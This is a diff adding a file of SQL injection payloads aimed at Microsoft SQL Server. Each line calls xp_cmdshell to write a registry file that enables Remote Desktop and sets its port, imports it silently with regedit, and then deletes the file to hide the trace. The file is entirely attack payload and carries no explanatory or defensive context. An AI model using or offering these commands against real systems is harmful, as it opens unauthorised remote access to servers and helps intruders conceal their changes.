@@ -1,0 +1,17 @@
+exec master..xp_cmdshell 'echo Windows Registry Editor Version 5.00>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'echo "fDenyTSConnections"=dword:00000000>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'echo "PortNumber"=dword:00000d3d>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'echo "PortNumber"=dword:00000d3d>>c:\hi.reg';--
+
+exec master..xp_cmdshell 'regedit /s c:\hi.reg';--
+
+exec master..xp_cmdshell 'del c:\hi.reg';--
